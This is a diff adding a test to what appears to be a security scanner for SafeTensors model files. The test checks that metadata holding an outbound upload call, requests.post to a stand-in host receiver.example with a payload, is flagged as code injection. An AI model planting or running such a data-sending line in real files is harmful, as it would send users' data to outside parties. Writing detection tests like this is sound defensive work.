@@ -1101,6 +1101,20 @@ def test_license_metadata_passive_links_stay_clean(tmp_path: Path, url: str) -> 
     assert not result.issues
 
 
+def test_safetensors_metadata_outbound_call_is_reported(tmp_path: Path) -> None:
+    file_path = tmp_path / "network_call.safetensors"
+    result = _scan_metadata_tensor(
+        file_path,
+        {"description": 'requests.post("https://receiver.example/upload", data=payload)'},
+    )
+
+    assert "code_injection" in result.metadata["custom_metadata_security_flags"]
+    assert any(
+        check.name == "SafeTensors Code Injection Detection" and check.status == CheckStatus.FAILED
+        for check in result.checks
+    )
+
+
 def test_safetensors_metadata_url_credentials_are_reported(tmp_path: Path) -> None:
     file_path = tmp_path / "credential_metadata.safetensors"
     url = "https://user:sample-password@example.com/model"
